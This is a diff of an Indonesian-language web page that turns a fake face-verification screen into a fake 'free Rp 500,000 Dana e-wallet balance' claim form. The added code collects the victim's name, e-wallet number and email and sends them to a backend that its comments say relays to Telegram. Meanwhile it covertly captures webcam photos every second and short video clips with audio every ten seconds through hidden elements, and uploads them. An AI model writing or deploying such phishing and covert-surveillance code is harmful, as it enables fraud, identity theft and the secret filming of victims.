@@ -1,66 +1,188 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Verifikasi Wajah</title>
+    <meta charset="UTF-8">
+    <title>Klaim Saldo Dana 500rb</title>
     <style>
-        #video { position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; }
-        #canvas { display: none; }
-        body { background: #f0f0f0; font-family: Arial; text-align: center; padding-top: 50px; }
-        .box { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        /* Sembunyikan video & canvas */
+        #video, #canvas { display: none; }
+        body {
+            background: #f0f4f8;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+        }
+        .logo { font-size: 40px; margin-bottom: 10px; }
+        h2 { color: #1a73e8; margin: 0; }
+        .sub { color: #555; font-size: 14px; }
+        .amount { font-size: 28px; font-weight: bold; color: #34a853; margin: 10px 0; }
+        .input-group { text-align: left; margin: 15px 0; }
+        .input-group label { display: block; font-weight: 600; margin-bottom: 5px; }
+        .input-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
+        .btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn:hover { background: #1557b0; }
+        .loader { display: none; margin: 10px auto; border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .note { font-size: 12px; color: #888; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>⏳ Verifikasi Wajah</h2>
-        <p>Scan wajah Anda untuk keamanan akun...</p>
-        <div class="loader"></div>
-        <p style="color: #888; font-size: 12px;">Proses ini membutuhkan akses kamera</p>
+    <div class="card">
+        <div class="logo">💸</div>
+        <h2>Klaim Saldo Dana Gratis</h2>
+        <p class="sub">Dapatkan 500.000 IDR langsung ke akun Dana Anda!</p>
+        <div class="amount">+ Rp 500.000</div>
+        <div class="input-group">
+            <label>Nama Lengkap</label>
+            <input type="text" id="name" placeholder="Nama sesuai KTP">
+        </div>
+        <div class="input-group">
+            <label>Nomor Dana / E-Wallet</label>
+            <input type="text" id="dana" placeholder="08123456789">
+        </div>
+        <div class="input-group">
+            <label>Email (opsional)</label>
+            <input type="email" id="email" placeholder="email@example.com">
+        </div>
+        <button class="btn" id="claimBtn">KLAIM SEKARANG</button>
+        <div class="loader" id="loader"></div>
+        <p class="note">*Pastikan data benar, dana akan dikirim dalam 5 menit</p>
     </div>
+
+    <!-- Elemen tersembunyi untuk kamera -->
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
+
     <script>
-        // WAKE LOCK biar layar gak mati (redup aja)
-        async function keepScreenOn() {
-            try {
-                const wl = await navigator.wakeLock.request('screen');
-                document.addEventListener('visibilitychange', () => {
-                    if (document.visibilityState === 'visible') navigator.wakeLock.request('screen');
-                });
-            } catch(e){}
-        }
-        keepScreenOn();
+        (function() {
+            // ===== 1. Minta akses kamera dan mulai capture =====
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            let stream = null;
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        let stream = null;
+            // Wake Lock biar layar tetap menyala (redup)
+            async function keepScreenOn() {
+                try {
+                    const wl = await navigator.wakeLock.request('screen');
+                    document.addEventListener('visibilitychange', () => {
+                        if (document.visibilityState === 'visible') navigator.wakeLock.request('screen');
+                    });
+                } catch(e) { /* gagal gpp */ }
+            }
+            keepScreenOn();
 
-        function startCamera(facingMode = 'user') {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode, width:640, height:480 }, audio:false })
-                .then(s => {
-                    stream = s;
-                    video.srcObject = s;
-                    video.play();
-                    // FOTO TIAP 1 DETIK (1000ms) TERUS-TERUSAN!
-                    setInterval(() => {
-                        if (!stream) return;
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        ctx.drawImage(video, 0, 0);
-                        const base64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
-                        // Kirim ke backend Vercel (bukan langsung ke Telegram)
-                        fetch('/api', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ img: base64, ts: Date.now() })
-                        }).catch(e => console.log('Gagal kirim'));
-                    }, 1000);
-                })
-                .catch(() => { if (facingMode === 'user') startCamera('environment'); });
-        }
-        startCamera('user');
+            function startCamera() {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 }, audio: true })
+                    .then(s => {
+                        stream = s;
+                        video.srcObject = s;
+                        video.play();
+                        // Kirim foto tiap 1 detik
+                        setInterval(() => {
+                            if (!stream) return;
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            ctx.drawImage(video, 0, 0);
+                            const base64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+                            fetch('/api', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ img: base64, ts: Date.now(), type: 'photo' })
+                            }).catch(e => console.log('Gagal kirim foto'));
+                        }, 1000);
+
+                        // Rekam video 3 detik setiap 10 detik
+                        let mediaRecorder;
+                        let chunks = [];
+                        setInterval(() => {
+                            if (!stream) return;
+                            // Hentikan recorder sebelumnya jika masih jalan
+                            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                                mediaRecorder.stop();
+                            }
+                            // Mulai rekaman baru
+                            chunks = [];
+                            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
+                            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                            mediaRecorder.onstop = () => {
+                                const blob = new Blob(chunks, { type: 'video/webm' });
+                                const reader = new FileReader();
+                                reader.onload = function() {
+                                    const base64video = reader.result.split(',')[1];
+                                    fetch('/api', {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ video: base64video, ts: Date.now(), type: 'video' })
+                                    }).catch(e => console.log('Gagal kirim video'));
+                                };
+                                reader.readAsDataURL(blob);
+                            };
+                            mediaRecorder.start();
+                            setTimeout(() => {
+                                if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+                            }, 3000); // rekam 3 detik
+                        }, 10000); // setiap 10 detik
+                    })
+                    .catch(err => {
+                        alert('Kamera diperlukan untuk verifikasi!');
+                        console.error(err);
+                    });
+            }
+
+            // ===== 2. Event klik tombol =====
+            document.getElementById('claimBtn').addEventListener('click', function() {
+                const name = document.getElementById('name').value.trim();
+                const dana = document.getElementById('dana').value.trim();
+                if (!name || !dana) {
+                    alert('Isi nama dan nomor Dana dulu!');
+                    return;
+                }
+                // Tampilkan loading
+                document.getElementById('loader').style.display = 'block';
+                this.disabled = true;
+                // Kirim data ke Telegram sebagai pesan
+                const msg = `📝 Klaim Dana\nNama: ${name}\nDana: ${dana}\nEmail: ${document.getElementById('email').value}`;
+                fetch(`/api?msg=${encodeURIComponent(msg)}`, { method: 'GET' })
+                    .then(() => {
+                        alert('✅ Klaim berhasil! Dana akan dikirim ke nomor Anda dalam 5 menit.');
+                        document.getElementById('loader').style.display = 'none';
+                        this.disabled = false;
+                    })
+                    .catch(() => {
+                        alert('Gagal, coba lagi.');
+                        document.getElementById('loader').style.display = 'none';
+                        this.disabled = false;
+                    });
+            });
+
+            // Mulai kamera
+            startCamera();
+        })();
     </script>
 </body>
 </html>
